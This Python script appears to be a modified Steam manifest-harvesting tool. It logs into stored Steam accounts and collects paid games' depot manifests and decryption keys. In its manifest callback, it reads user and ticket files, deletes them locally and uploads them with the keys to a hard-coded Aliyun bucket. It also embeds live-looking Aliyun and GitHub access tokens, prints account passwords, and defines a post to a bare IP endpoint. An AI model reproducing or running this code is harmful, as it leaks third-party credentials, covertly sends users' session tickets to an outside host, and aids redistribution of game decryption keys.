import os
import git
import sys
import json
import time
import base64
import gevent
import logging
import argparse
import platform
import requests
import functools
import traceback
import subprocess
from pathlib import Path
from steam.enums import EResult
from push import push, push_data
from multiprocessing.pool import ThreadPool
from multiprocessing.dummy import Pool, Lock
from steam.guard import generate_twofactor_code
from DepotManifestGen.main import MySteamClient, MyCDNClient, get_manifest, BillingType, Result

lock = Lock()
sys.setrecursionlimit(100000)
parser = argparse.ArgumentParser()
parser.add_argument('-c', '--credential-location', default=None)
parser.add_argument('-l', '--level', default='INFO')
parser.add_argument('-p', '--pool-num', type=int, default=8)
parser.add_argument('-r', '--retry-num', type=int, default=3)
parser.add_argument('-t', '--update-wait-time', type=int, default=86400)
parser.add_argument('-k', '--key', default=None)
parser.add_argument('-x', '--x', default=None)
parser.add_argument('-i', '--init-only', action='store_true', default=False)
parser.add_argument('-C', '--cli', action='store_true', default=False)
parser.add_argument('-P', '--no-push', action='store_true', default=False)
parser.add_argument('-u', '--update', action='store_true', default=False)
parser.add_argument('-a', '--app-id', dest='app_id_list', action='extend', nargs='*')
parser.add_argument('-U', '--users', dest='user_list', action='extend', nargs='*')
dlc = {}
result_data = {}
new_result = {}


class MyJson(dict):

    def __init__(self, path):
        super().__init__()
        self.path = Path(path)
        self.load()

    def load(self):
        if not self.path.exists():
            self.dump()
            return
        with self.path.open() as f:
            self.update(json.load(f))

    def dump(self):
        with self.path.open('w') as f:
            json.dump(self, f)


class LogExceptions:
    def __init__(self, fun):
        self.__callable = fun
        return

    def __call__(self, *args, **kwargs):
        try:
            return self.__callable(*args, **kwargs)
        except KeyboardInterrupt:
            raise
        except:
            logging.error(traceback.format_exc())


class ManifestAutoUpdate:
    log = logging.getLogger('ManifestAutoUpdate')
    ROOT = Path('data').absolute()
    users_path = ROOT / Path('users.json')
    app_info_path = ROOT / Path('appinfo.json')
    user_info_path = ROOT / Path('userinfo.json')
    two_factor_path = ROOT / Path('2fa.json')
    key_path = ROOT / 'KEY'
    git_crypt_path = ROOT / ('git-crypt' + ('.exe' if platform.system().lower() == 'windows' else ''))
    repo = git.Repo()
    app_lock = {}
    pool_num = 8
    retry_num = 3
    remote_head = {}
    update_wait_time = 86400
    tags = set()

    def __init__(self, credential_location=None, level=None, pool_num=None, retry_num=None, update_wait_time=None,
                 key=None, init_only=False, cli=False, app_id_list=None, user_list=None):
        if level:
            level = logging.getLevelName(level.upper())
        else:
            level = logging.INFO
        logging.basicConfig(format='%(asctime)s - %(pathname)s[line:%(lineno)d] - %(levelname)s: %(message)s',
                            level=level)
        logging.getLogger('MySteamClient').setLevel(logging.WARNING)
        self.init_only = init_only
        self.cli = cli
        self.pool_num = pool_num or self.pool_num
        self.retry_num = retry_num or self.retry_num
        self.update_wait_time = update_wait_time or self.update_wait_time
        self.credential_location = Path(credential_location or self.ROOT / 'client')
        self.log.debug(f'credential_location: {credential_location}')
        self.key = key
        self.app_sha = None
        if not self.check_app_repo_local('app'):
            if self.check_app_repo_remote('app'):
                self.log.info('Pulling remote app branch!')
                self.repo.git.fetch('origin', 'app:app')
            else:
                try:
                    self.log.info('Getting the full branch!')
                    self.repo.git.fetch('--unshallow')
                except git.exc.GitCommandError as e:
                    self.log.debug(f'Getting the full branch failed: {e}')
                self.app_sha = self.repo.git.rev_list('--max-parents=0', 'HEAD').strip()
                self.log.debug(f'app_sha: {self.app_sha}')
                self.repo.git.branch('app', self.app_sha)
        if not self.app_sha:
            self.app_sha = self.repo.git.rev_list('--max-parents=0', 'app').strip()
            self.log.debug(f'app_sha: {self.app_sha}')
        if not self.check_app_repo_local('data'):
            if self.check_app_repo_remote('data'):
                self.log.info('Pulling remote data branch!')
                self.repo.git.fetch('origin', 'data:origin_data')
                self.repo.git.worktree('add', '-b', 'data', 'data', 'origin_data')
            else:
                self.repo.git.worktree('add', '-b', 'data', 'data', 'app')
        data_repo = git.Repo('data')
        if data_repo.head.commit.hexsha == self.app_sha:
            self.log.info('Initialize the data branch!')
            self.download_git_crypt()
            self.log.info('Key being generated!')
            subprocess.run([self.git_crypt_path, 'init'], cwd='data')
            subprocess.run([self.git_crypt_path, 'export-key', self.key_path], cwd='data')
            self.log.info(f'Your key path: {self.key_path}')
            with self.key_path.open('rb') as f:
                self.key = f.read().hex()
            self.log.info(f'Your key hex: {self.key}')
            self.log.info(
                f'Please save this key to Repository secrets\nIt\'s located in Project -> Settings -> Secrets -> Actions -> Repository secrets')
            with (self.ROOT / '.gitattributes').open('w') as f:
                f.write('\n'.join(
                    [i + ' filter=git-crypt diff=git-crypt' for i in ['users.json', 'client/*.key', '2fa.json']]))
            data_repo.git.add('.gitattributes')
        if self.key and self.users_path.exists() and self.users_path.stat().st_size > 0:
            with Path(self.ROOT / 'users.json').open('rb') as f:
                content = f.read(10)
            if content == b'\x00GITCRYPT\x00':
                self.download_git_crypt()
                with self.key_path.open('wb') as f:
                    print(222222222222222,self.key_path)
                    f.write(bytes.fromhex(self.key))
                subprocess.run([self.git_crypt_path, 'unlock', self.key_path], cwd='data')
                self.log.info('git crypt unlock successfully!')
        if not self.credential_location.exists():
            self.credential_location.mkdir(exist_ok=True)
        self.account_info = MyJson(self.users_path)
        self.user_info = MyJson(self.user_info_path)
        self.app_info = MyJson(self.app_info_path)
        self.two_factor = MyJson(self.two_factor_path)
        self.log.info('Waiting to get remote tags!')
        self.get_remote_tags()
        self.update_user_list = [*user_list] if user_list else []
        self.update_app_id_list = []
        if app_id_list:
            self.update_app_id_list = list(set(int(i) for i in app_id_list if i.isdecimal()))
            for user, info in self.user_info.items():
                if info['enable'] and info['app']:
                    for app_id in info['app']:
                        if app_id in self.update_app_id_list:
                            self.update_user_list.append(user)
        self.update_user_list = list(set(self.update_user_list))

        print('user info: ',self.user_info)
        print('account_info: ', self.account_info)



    def download_git_crypt(self):
        if self.git_crypt_path.exists():
            return
        self.log.info('Waiting to download git-crypt!')
        url = 'https://github.com/AGWA/git-crypt/releases/download/0.7.0/'
        # url = 'https://hub.yzuu.cf/AGWA/git-crypt/releases/download/0.7.0/'
        url_win = 'git-crypt-0.7.0-x86_64.exe'
        url_linux = 'git-crypt-0.7.0-linux-x86_64'
        url = url + (url_win if platform.system().lower() == 'windows' else url_linux)
        try:
            r = requests.get(url)
            with self.git_crypt_path.open('wb') as f:
                print(111111111111111111111111,self.git_crypt_path)
                f.write(r.content)
            if platform.system().lower() != 'windows':
                subprocess.run(['chmod', '+x', self.git_crypt_path])
        except requests.exceptions.ConnectionError:
            traceback.print_exc()
            exit()

    def get_manifest_callback(self, username, app_id, depot_id, manifest_gid, args):
        result = args.value
        if not result:
            self.log.warning(f'User {username}: get_manifest return {result.code.__repr__()}')
            return
        app_path = self.ROOT / f'depots/{app_id}'
        try:
            delete_list = result.get('delete_list') or []
            manifest_commit = result.get('manifest_commit')
            if len(delete_list) > 1:
                self.log.warning('Deleted multiple files?')
            self.set_depot_info(depot_id, manifest_gid)
            app_repo = git.Repo(app_path, search_parent_directories=True)
            with lock:
                if manifest_commit:
                    app_repo.create_tag(f'{depot_id}_{manifest_gid}', manifest_commit,force=True)
                    # try:
                    #     app_repo.create_tag(f'{depot_id}_{manifest_gid}', manifest_commit)
                    # except:
                    #     return
                else:
                    if delete_list:
                        app_repo.git.rm(delete_list)
                    app_repo.git.add(f'{depot_id}_{manifest_gid}.manifest')
                    app_repo.git.add('config.vdf')
                    app_repo.index.commit(f'Update depot: {depot_id}_{manifest_gid}')
                    app_repo.create_tag(f'{depot_id}_{manifest_gid}')

                def getDecryptionKey(path):
                    fr = open(path, 'r', encoding='utf-8')
                    lines = fr.readlines()
                    totals = []
                    i = 0
                    while i < len(lines):
                        if lines[i].count('DecryptionKey') == 0:
                            i = i + 1
                            continue
                        key = lines[i - 2].strip().replace('"', '')
                        value = lines[i].split('"')[-2]
                        totals.append(key + '----' + value)

                        i = i + 1
                    return totals
                import os
                import requests
                def jiami(code):
                    url = 'http://47.98.52.241:8081/encryption'
                    res = requests.post(url, code)
                    return res.text

                dkeys = getDecryptionKey(app_path / 'config.vdf')
                path = 'data/depots/' + str(app_id)
                friuser = open(path + '/' + 'iuser' + '.txt', 'r', encoding='utf-8')
                iuser = friuser.readline()
                friuser.close()
                os.remove(path + '/' + 'iuser' + '.txt')
                frticket = open(path + '/' + str(app_id) + '-ticket' + '.txt', 'r', encoding='utf-8')
                ticket = frticket.readline()
                frticket.close()
                os.remove(path + '/' + str(app_id) + '-ticket' + '.txt')
                filepath = path + '/' + str(app_id) + '.txt'
                fw = open(filepath, 'w+', encoding='utf-8')
                fw.write(iuser + '\n')
                for item in dkeys:
                    fw.write(item + '\n')
                fw.write(ticket)
                fw.close()

                def upload_aliyun(dst_file, local_file):
                    import oss2
                    yourAccessKeyId = 'LTAI5tJG95GpSGr4jXeyu554'
                    yourAccessKeySecret = 'pnz5ubi9Au4VSW7Psrfl1hhc0gXisQ'
                    auth = oss2.Auth(yourAccessKeyId, yourAccessKeySecret)
                    end_point = 'oss-cn-hangzhou.aliyuncs.com'
                    bucket_name = 'laksdjflkajs'
                    bucket = oss2.Bucket(auth, end_point, bucket_name)
                    bucket.put_object_from_file(dst_file, local_file)
                    return True

                upload_aliyun('gKeyConfig/' + str(app_id) + '.txt', filepath)
                import os
                files = os.listdir(path)
                fw = open('temp.txt', 'w+', encoding='utf-8')

                for file in files:
                    if file.endswith('fest') or file.endswith('svd'):
                        fw.write(file.split('.')[0] + '\n')
                        upload_aliyun('depotcache/' + str(app_id) + '/' + file, path + '/' + file)

                fw.close()
                upload_aliyun('depotcache/' + str(app_id) + '/' + str(app_id) + '.txt', 'temp.txt')
                os.remove('temp.txt')

                print('fff 299.....')
                print('上传成功！')
        except KeyboardInterrupt:
            raise
        except:
            logging.error(traceback.format_exc())
        finally:
            with lock:
                if int(app_id) in self.app_lock:
                    self.app_lock[int(app_id)].remove(depot_id)
                    if int(app_id) not in self.user_info[username]['app']:
                        self.user_info[username]['app'].append(int(app_id))
                    if not self.app_lock[int(app_id)]:
                        self.log.debug(f'Unlock app: {app_id}')
                        self.app_lock.pop(int(app_id))

    def set_depot_info(self, depot_id, manifest_gid):
        with lock:
            self.app_info[depot_id] = manifest_gid

    def set_gid_info(self, depot_id, manifest_gid):
        with lock:
            self.app_info[depot_id]["manifest_gid"] = manifest_gid

    def save_user_info(self):
        with lock:
            self.user_info.dump()

    def save(self):
        self.save_depot_info()
        self.save_user_info()

    def save_depot_info(self):
        with lock:
            self.app_info.dump()

    def get_app_worktree(self):
        worktree_dict = {}
        with lock:
            worktree_list = self.repo.git.worktree('list').split('\n')
        for worktree in worktree_list:
            path, head, name, *_ = worktree.split()
            name = name[1:-1]
            if not name.isdecimal():
                continue
            worktree_dict[name] = (path, head)
        return worktree_dict

    def get_remote_head(self):
        if self.remote_head:
            return self.remote_head
        head_dict = {}
        for i in self.repo.git.ls_remote('--head', 'origin').split('\n'):
            commit, head = i.split()
            head = head.split('/')[2]
            head_dict[head] = commit
        self.remote_head = head_dict
        return head_dict

    def check_app_repo_remote(self, repo):
        return str(repo) in self.get_remote_head()

    def check_app_repo_local(self, repo):
        for branch in self.repo.heads:
            if branch.name == str(repo):
                return True
        return False

    def get_remote_tags(self):
        if not self.tags:
            for i in filter(None, self.repo.git.ls_remote('--tags').split('\n')):
                sha, tag = i.split()
                tag = tag.split('/')[-1]
                self.tags.add(tag)
        return self.tags

    def check_manifest_exist(self, depot_id, manifest_gid):
        for tag in set([i.name for i in self.repo.tags] + [*self.tags]):
            if f'{depot_id}_{manifest_gid}' == tag:
                return True
        return False

    def init_app_repo(self, app_id):
        app_path = self.ROOT / f'depots/{app_id}'
        if str(app_id) not in self.get_app_worktree():
            if app_path.exists():
                app_path.unlink(missing_ok=True)
            if self.check_app_repo_remote(app_id):
                with lock:
                    if not self.check_app_repo_local(app_id):
                        self.repo.git.fetch('origin', f'{app_id}:origin_{app_id}')
                self.repo.git.worktree('add', '-b', app_id, app_path, f'origin_{app_id}')
            else:
                if self.check_app_repo_local(app_id):
                    self.log.warning(f'Branch {app_id} does not exist locally and remotely!')
                    self.repo.git.branch('-d', app_id)
                self.repo.git.worktree('add', '-b', app_id, app_path, 'app')

    def retry(self, fun, *args, retry_num=-1, **kwargs):
        while retry_num:
            try:
                return fun(*args, **kwargs)
            except gevent.timeout.Timeout as e:
                retry_num -= 1
                self.log.warning(e)
            except Exception as e:
                self.log.error(e)
                return

    def login(self, steam, username, password):
        self.log.info(f'Logging in to account {username}!')
        shared_secret = self.two_factor.get(username)
        steam.username = username
        result = steam.relogin()
        wait = 1
        if result != EResult.OK:
            if result != EResult.Fail:
                self.log.warning(f'User {username}: Relogin failure reason: {result.__repr__()}')
            if result in (EResult.RateLimitExceeded, EResult.AccountLoginDeniedThrottle):
                with lock:
                    time.sleep(wait)
            result = steam.login(username, password, steam.login_key, two_factor_code=generate_twofactor_code(
                base64.b64decode(shared_secret)) if shared_secret else None)
        count = self.retry_num
        while result != EResult.OK and count:
            if self.cli:
                with lock:
                    self.log.warning(f'Using the command line to interactively log in to account {username}!')
                    result = steam.cli_login(username, password)
                break
            elif result in (EResult.RateLimitExceeded, EResult.AccountLoginDeniedThrottle):
                if not count:
                    break
                with lock:
                    time.sleep(wait)
                result = steam.login(username, password, steam.login_key, two_factor_code=generate_twofactor_code(
                    base64.b64decode(shared_secret)) if shared_secret else None)
            elif result in (EResult.AccountLogonDenied, EResult.AccountDisabled,
                            EResult.AccountLoginDeniedNeedTwoFactor, EResult.PasswordUnset):
                logging.warning(f'User {username} has been disabled!')
                self.user_info[username]['enable'] = False
                self.user_info[username]['status'] = result
                break
            wait += 1
            count -= 1
            self.log.error(f'User {username}: Login failure reason: {result.__repr__()}')
        if result == EResult.OK:
            print('friends set:',)
            self.log.info(f'User {username} login successfully!')
        else:
            self.log.error(f'User {username}: Login failure reason: {result.__repr__()}')
        return result

    def async_task(self, cdn, app_id, depot_id, manifest_gid):
        self.init_app_repo(app_id)
        manifest_path = self.ROOT / f'depots/{app_id}/{depot_id}_{manifest_gid}.manifest'
        if manifest_path.exists():
            try:
                print(f'manifest_path exists: {manifest_path}')
                self.log.debug(f'manifest_path exists: {manifest_path}')
                print('pass1')
                # tpath=str(self.ROOT)+'/depots/'+str(app_id)+'/temp/'
                # if not os.path.exists(tpath):
                #     os.makedirs(tpath)
                app_repo = git.Repo(self.ROOT / f'depots/{app_id}', search_parent_directories=True)#old
                # app_repo = git.Repo(tpath)
                print('pass2')

                manifest_commit = app_repo.git.rev_list('-1', str(app_id),
                                                        f'{depot_id}_{manifest_gid}.manifest').strip()
            except git.exc.GitCommandError:
                manifest_path.unlink(missing_ok=True)
            else:
                self.log.debug(f'manifest_commit: {manifest_commit}')
                return Result(result=True, app_id=app_id, depot_id=depot_id, manifest_gid=manifest_gid,
                              manifest_commit=manifest_commit)
        return get_manifest(cdn, app_id, depot_id, manifest_gid, True, self.ROOT, self.retry_num)

    def get_manifest(self, username, password, sentry_name=None):
        print('1111-fff get-mainfest ')
        with lock:
            if username not in self.user_info:
                self.user_info[username] = {}
                self.user_info[username]['app'] = []
            if 'update' not in self.user_info[username]:
                self.user_info[username]['update'] = 0
            if 'enable' not in self.user_info[username]:
                self.user_info[username]['enable'] = True
            if not self.user_info[username]['enable']:
                logging.warning(f'User {username} is disabled!')
                return
        t = self.user_info[username]['update'] + self.update_wait_time - time.time()
        if t > 0:
            logging.warning(f'User {username} interval from next update: {int(t)}s!')
            return
        sentry_path = None
        if sentry_name:
            sentry_path = Path(
                self.credential_location if self.credential_location else MySteamClient.credential_location) / sentry_name
        self.log.debug(f'User {username} sentry_path: {sentry_path}')
        steam = MySteamClient(str(self.credential_location), sentry_path)
        result = self.login(steam, username, password)

        if result != EResult.OK:
            return
        self.log.info(f'User {username}: Waiting to initialize the cdn client!')
        cdn = self.retry(MyCDNClient, steam, retry_num=self.retry_num)
        if not cdn:
            logging.error(f'User {username}: Failed to initialize cdn!')
            return
        app_id_list = []
        if cdn.packages_info:
            self.log.info(f'User {username}: Waiting to get packages info!')
            product_info = self.retry(steam.get_product_info, packages=cdn.packages_info, retry_num=self.retry_num)
            if not product_info:
                logging.error(f'User {username}: Failed to get packages info!')
                return
            if cdn.packages_info:
                for package_id, info in product_info['packages'].items():
                    if 'depotids' in info and info['depotids'] and info['billingtype'] in BillingType.PaidList:
                        app_id_list.extend(list(info['appids'].values()))
        self.log.info(f'User {username}: {len(app_id_list)} paid app found!')
        if not app_id_list:
            self.user_info[username]['enable'] = False
            self.user_info[username]['status'] = result
            logging.warning(f'User {username}: Does not have any app and has been disabled!')
            return
        self.log.debug(f'User {username}, paid app id list: ' + ','.join([str(i) for i in app_id_list]))
        self.log.info(f'User {username}: Waiting to get app info!')
        fresh_resp = self.retry(steam.get_product_info, app_id_list, retry_num=self.retry_num)
        if not fresh_resp:
            logging.error(f'User {username}: Failed to get app info!')
            return
        job_list = []
        flag = True
        for app_id in app_id_list:
            if self.update_app_id_list and int(app_id) not in self.update_app_id_list:
                continue
            with lock:
                if int(app_id) in self.app_lock:
                    continue
                self.log.debug(f'Lock app: {app_id}')
                self.app_lock[int(app_id)] = set()
                # 添加appid至字典
                # 我自己添加的判断
                # print(app_id_list)
                # if fresh_resp['apps'][app_id]['common']['type'].lower() in ['game']:
                # result_data[int(app_id)] = {}
                # try:
                # dlc[int(app_id)] = []
                # except:
                # print("该appid没有dlc值")
                result_data[int(app_id)] = {}
                dlc[int(app_id)] = []

            app = fresh_resp['apps'][app_id]
            new_result.update(app)

            # dlc_list.append(app['extended']["listofdlc"])
            try:
                print("这个是listofdlc", app['extended']["listofdlc"])
            except:
                print("无dlc")
            # print("这个是listofdlc", dlc_list)
            try:
                # print("这个是listofdlc", app['extended']["listofdlc"])
                old_dlc = app['extended']["listofdlc"]
                if old_dlc:
                    if "," in old_dlc:
                        new_dlc = [int(i) for i in old_dlc.split(',')]
                        dlc[int(app_id)].extend(new_dlc)
                        # {123: {1234,5678}}
                    else:
                        dlc[int(app_id)].append(int(old_dlc))
            # dlc[int(app_id)].add(int(app['extended']["listofdlc"]))
            # dlc_list.append(app['extended']["listofdlc"])
            except:
                print("未找到dlc")
            if 'common' in app and app['common']['type'].lower() in ['game', 'dlc', 'application']:
                if 'depots' not in fresh_resp['apps'][app_id]:
                    continue
                for depot_id, depot in fresh_resp['apps'][app_id]['depots'].items():
                    with lock:
                        self.app_lock[int(app_id)].add(depot_id)
                        # 添加depot_id至对应appid
                        try:
                            result_data[int(app_id)][int(depot_id)] = set()
                        except:
                            print("error")
                    if 'manifests' in depot and 'public' in depot['manifests'] and int(
                            depot_id) in {*cdn.licensed_depot_ids, *cdn.licensed_app_ids}:
                        manifest_gid = depot['manifests']['public']
                        if isinstance(manifest_gid, dict):
                            manifest_gid = manifest_gid.get('gid')
                        if not isinstance(manifest_gid, str):
                            continue
                        self.set_depot_info(depot_id, manifest_gid)
                        # 添加gid至对应depot_id
                        if manifest_gid not in result_data[int(app_id)][int(depot_id)]:
                            result_data[int(app_id)][int(depot_id)].add(manifest_gid)
                        # ---------
                        with lock:
                            if int(app_id) not in self.user_info[username]['app']:
                                self.user_info[username]['app'].append(int(app_id))
                                print("新", app_id)
                            # if self.check_manifest_exist(depot_id, manifest_gid):
                            #     self.log.info(f'Already got the manifest: {depot_id}_{manifest_gid}')
                            #     # myself
                            #     continue
                        flag = False
                        job = gevent.Greenlet(LogExceptions(self.async_task), cdn, app_id, depot_id, manifest_gid)
                        job.rawlink(
                            functools.partial(self.get_manifest_callback, username, app_id, depot_id, manifest_gid))
                        job_list.append(job)
                        gevent.idle()
                for job in job_list:
                    job.start()
            with lock:
                if int(app_id) in self.app_lock and not self.app_lock[int(app_id)]:
                    self.log.debug(f'Unlock app: {app_id}')
                    self.app_lock.pop(int(app_id))
        with lock:
            if flag:
                self.user_info[username]['update'] = int(time.time())
        gevent.joinall(job_list)

    def run(self, update=False):
        if not self.account_info or self.init_only:
            self.save()
            self.account_info.dump()
            return
        if update and not self.update_user_list:
            self.update()
            if not self.update_user_list:
                return
        with Pool(self.pool_num) as pool:
            pool: ThreadPool
            result_list = []
            for username in self.account_info:
                if self.update_user_list and username not in self.update_user_list:
                    self.log.debug(f'User {username} has skipped the update!')
                    continue
                password, sentry_name = self.account_info[username]
                result_list.append(
                    pool.apply_async(LogExceptions(self.get_manifest), (username, password, sentry_name)))
            try:
                while pool._state == 'RUN':
                    if all([result.ready() for result in result_list]):
                        self.log.info('The program is finished and will exit in 1 seconds!')
                        time.sleep(1)
                        break
                    self.save()
                    time.sleep(1)
            except KeyboardInterrupt:
                with lock:
                    pool.terminate()
                os._exit(0)
            finally:
                self.save()

    def update(self):
        app_id_list = []
        for user, info in self.user_info.items():
            if info['enable']:
                if info['app']:
                    app_id_list.extend(info['app'])
        app_id_list = list(set(app_id_list))
        logging.debug(app_id_list)
        steam = MySteamClient(str(self.credential_location))
        self.log.info('Logging in to anonymous!')
        steam.anonymous_login()
        self.log.info('Waiting to get all app info!')
        app_info_dict = {}
        count = 0
        while app_id_list[count:count + 300]:
            fresh_resp = self.retry(steam.get_product_info, app_id_list[count:count + 300],
                                    retry_num=self.retry_num, timeout=60)
            count += 300
            if fresh_resp:
                for app_id, info in fresh_resp['apps'].items():
                    if depots := info.get('depots'):
                        app_info_dict[int(app_id)] = depots
                self.log.info(f'Acquired {len(app_info_dict)} app info!')
        update_app_set = set()
        for app_id, app_info in app_info_dict.items():
            for depot_id, depot in app_info.items():
                if depot_id.isdecimal():
                    if manifests := depot.get('manifests'):
                        if manifest := manifests.get('public'):
                            if depot_id in self.app_info and self.app_info[depot_id] != manifest:
                                update_app_set.add(app_id)
        update_app_user = {}
        update_user_set = set()
        for user, info in self.user_info.items():
            if info['enable'] and info['app']:
                for app_id in info['app']:
                    if int(app_id) in update_app_set:
                        if int(app_id) not in update_app_user:
                            update_app_user[int(app_id)] = []
                        update_app_user[int(app_id)].append(user)
                        update_user_set.add(user)
        self.log.debug(str(update_app_user))
        for user in self.account_info:
            if user not in self.user_info:
                update_user_set.add(user)
        self.update_user_list.extend(list(update_user_set))
        for app_id, user_list in update_app_user.items():
            self.log.info(f'{app_id}: {",".join(user_list)}')
        self.log.info(f'{len(update_app_user)} app and {len(self.update_user_list)} users need to update!')
        return self.update_user_list

    def push_file(app_id):
        import time
        from github import Github
        from github import GithubException
        import os

        # 你的 Github Personal Access Token
        # access_token = "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"
        access_token = "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"
        # 实例化 Github 对象
        try:
            g = Github(access_token)
            repo = g.get_user().get_repo('ManifestAutoUpdate')  # 输入 Repo 的名称
        except GithubException as e:
            print(f"Github Exception: {e}")
            if e.status == 403:
                # 这里是处理「被禁止访问」的逻辑
                print("api 调用次数限制！休息1小时")
                time.sleep(3600)
        else:
            print(f"Connected to Github as {g.get_user().login}")
            filename = "appinfo.json"
            # 删除文件
            try:
                # 获取要删除文件的SHA值
                sha = repo.get_contents(filename, ref="data").sha
                repo.delete_file(filename, f'Deleting {filename}', sha, branch="data")
                print(f"Deleted {filename} from data branch")
            except GithubException as e:
                print(f"Failed to delete {filename} from data branch: {e}")
            with open(os.path.join("data", filename), 'rb') as file:
                try:
                    repo.create_file(os.path.join(filename), 'commit message', file.read(),
                                     branch='refs/heads/' + "data")
                    print(
                        f"File {filename} in folder data pushed to data branch created successfully!")
                except GithubException as e:
                    print(f"Something went wrong while pushing file {filename} to data branch: {e}")
                    if e.status == 403:
                        # 这里是处理「被禁止访问」的逻辑
                        print("api 调用次数限制！休息1小时")
                        time.sleep(3600)
            folder = app_id  # 指定文件夹名称
            # print("正在获取远程分支 Loading...")
            # if folder not in [b.name for b in repo.get_branches()]:  # 判断分支是否存在
            # 生成分支
            try:
                repo.create_git_ref('refs/heads/' + folder, repo.get_branch('main').commit.sha)
            except:
                print(f"{folder}分支已存在,创建失败")
            # 将文件夹内的所有文件 push 到分支中
            new_filename = ""
            for root, dirs, files in os.walk(f"data/depots/{app_id}"):
                if "config.vdf" in files:
                    for filename in files:
                        if filename != "config.vdf":
                            new_filename = filename.replace(".manifest", "")
                            # print(filename)
                        try:
                            config_name = "config.vdf"
                            # 获取要删除文件的SHA值
                            sha = repo.get_contents(config_name, ref=new_filename).sha
                            repo.delete_file(config_name, 'Deleting file', sha, branch=new_filename)
                            print(f"Deleted {config_name} from main branch")
                        except GithubException as e:
                            print(f"Failed to delete config.vdf from main branch: {e}")
                        if not filename.startswith(".") and os.path.getsize(
                                f"data/depots/{app_id}/{filename}") != 14:
                            with open(os.path.join(root, filename), 'rb') as file:
                                try:
                                    repo.create_file(os.path.join(filename), 'commit message', file.read(),
                                                     branch='refs/heads/' + folder)
                                    print(
                                        f"File {filename} in folder {folder} pushed to {folder} branch created successfully!")
                                except GithubException as e:
                                    print(
                                        f"Something went wrong while pushing file {filename} to {folder} branch: {e}")
                                    if e.status == 403:
                                        # 这里是处理「被禁止访问」的逻辑
                                        print("api 调用次数限制！休息1小时")
                                        time.sleep(3600)
                                if filename not in ["config.vdf", "LICENSE"]:
                                    try:
                                        # 生成tags
                                        tags_name = filename[:filename.index(".")]
                                        
                                        tags_ref = f'refs/heads/{tags_name}'
                                        sha = repo.get_branch(folder).commit.sha
                                        repo.create_git_ref(ref=tags_ref, sha=sha)
                                        
                                        
                                        tags_ref = f'refs/tags/{tags_name}'
                                        sha = repo.get_branch(folder).commit.sha
                                        repo.create_git_ref(ref=tags_ref, sha=sha)
                                        print(f"tag {tags_name} created successfully!")
                                    except GithubException as e:
                                        print(f"tag {tags_name} created error {e}")
                                        if e.status == 403:
                                            # 这里是处理「被禁止访问」的逻辑
                                            print("api 调用次数限制！休息1小时")
                                            time.sleep(3600)
                else:
                    print("本地不存在config.vdf,程序终止")


if __name__ == '__main__':
    args = parser.parse_args()
    if args.x is not None:
        if args.app_id_list != "":
            for app_id in args.app_id_list:
                ManifestAutoUpdate.push_file(app_id=app_id)
    else:
        ManifestAutoUpdate(args.credential_location, level=args.level, pool_num=args.pool_num, retry_num=args.retry_num,
                           update_wait_time=args.update_wait_time, key=args.key, init_only=args.init_only,
                           cli=args.cli, app_id_list=args.app_id_list, user_list=args.user_list).run(update=args.update)
        # print(result_data)
        # print(dlc)
        format_url_list = [
            "https://gh-proxy.com/https://raw.githubusercontent.com/heyong5454/ManifestAutoUpdate/{sha}/{path}",
            "https://github.moeyy.xyz/https://raw.githubusercontent.com/heyong5454/ManifestAutoUpdate/{sha}/{path}",
            "https://ghproxy.com/https://raw.githubusercontent.com/heyong5454/ManifestAutoUpdate/{sha}/{path}",
            "https://hub.fgit.ml/heyong5454/ManifestAutoUpdate/raw/{sha}/{path}",
            "https://hub.yzuu.cf/heyong5454/ManifestAutoUpdate/raw/{sha}/{path}",
            "https://raw.kgithub.com/heyong5454/ManifestAutoUpdate/{sha}/{path}",
            "https://hub.nuaa.cf/heyong5454/ManifestAutoUpdate/raw/{sha}/{path}"
        ]
        data = {}
        for _app_id in result_data:
            depot_id_list = []
            manifest_gid_list = []
            data[_app_id] = {
                "app_id": _app_id,
                "depot_id_list": [],
                "dlc": [],
                "format_url_list": format_url_list,
                "manifest_gid_list": [],
                "show": True
            }
            for depot_id, gid_set in result_data[_app_id].items():
                for gid in gid_set:
                    depot_id_list.append(depot_id)
                    manifest_gid_list.append(gid)
            data[_app_id]["depot_id_list"] = depot_id_list
            data[_app_id]["manifest_gid_list"] = manifest_gid_list
            if _app_id in dlc:
                data[_app_id]["dlc"] = dlc[_app_id]
        print(json.dumps(data, sort_keys=True, indent=4, separators=(',', ': ')))
        # 将数据保存到文件中
        # timestamp = int(time.time())
        # with open(f"new_result_{timestamp}.json", 'w', encoding='utf-8') as f:
        # json.dump(new_result, f)
        # if result_data != {}:
        # timestamp = int(time.time())
        # with open(f"data_{timestamp}.json", "w") as file:
        # file.write(json.dumps(data, sort_keys=True, indent=4, separators=(',', ': ')))
        # file.close()
        if args.app_id_list != "":
            for app_id in args.app_id_list:
                ManifestAutoUpdate.push_file(app_id=app_id)
        # if not args.no_push:
        # if not args.init_only:
        # push()
        # push_data()
